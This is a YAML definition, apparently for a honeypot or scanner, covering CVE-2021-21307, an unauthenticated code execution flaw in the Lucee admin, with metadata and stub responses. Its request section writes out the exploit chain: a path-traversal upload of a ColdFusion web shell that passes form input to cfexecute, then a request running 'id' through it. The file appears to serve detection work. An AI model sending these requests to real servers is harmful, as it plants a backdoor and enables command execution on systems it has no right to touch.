id: CVE-2021-21307
info:
  name: Lucee Admin - Remote Code Execution
  author: dhiyaneshDk
  description: Lucee Admin before versions 5.3.7.47, 5.3.6.68 or 5.3.5.96 contains
    an unauthenticated remote code execution vulnerability.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  remediation: This is fixed in versions 5.3.7.47, 5.3.6.68 or 5.3.5.96. As a workaround,
    block access to the Lucee Administrator.
  reference:
  - https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r
  - https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21307
  - http://ciacfug.org/blog/updating-lucee-as-part-of-a-vulnerability-alert-response
  - https://dev.lucee.org/t/lucee-vulnerability-alert-november-2020/7643
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-21307
    cwe-id: CWE-862
    epss-score: 0.97312
    epss-percentile: 0.99864
    cpe: cpe:2.3:a:lucee:lucee_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: lucee
    product: lucee_server
  tags: cve2021,cve,rce,lucee,adobe
traps:
- request:
    method: POST
    path: /lucee/admin/imgProcess.cfm?file=/whatever
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'imgSrc=a

      '
  response:
    status_code: 200
    headers: {}
    body: uid=gid=groups=
- request:
    method: POST
    path: /lucee/admin/imgProcess.cfm?file=/../../../context/.cfm
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      imgSrc=
      <cfoutput>

      <table>
      <form method="POST" action="">
      <tr><td>Command:</td><td><input type=test name="cmd" size=50
      <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
      <tr><td>Options:</td><td> <input type=text name="opts" size=50
      <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
      <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
      <cfif isdefined("form.timeout")>value="#form.timeout#"
      <cfelse> value="5"</cfif>></td></tr>
      </table>
      <input type=submit value="Exec" >
      </form>
      <cfif isdefined("form.cmd")>
      <cfsavecontent variable="myVar">
      <cfexecute name = "#Form.cmd#"
      arguments = "#Form.opts#"
      timeout = "#Form.timeout#">
      </cfexecute>
      </cfsavecontent>
      <pre>
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /lucee/.cfm
    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Content-Type: application/x-www-form-urlencoded
    body: 'cmd=id&opts=&timeout=5

      '
  response:
    status_code: 200
    headers: {}
    body: ''
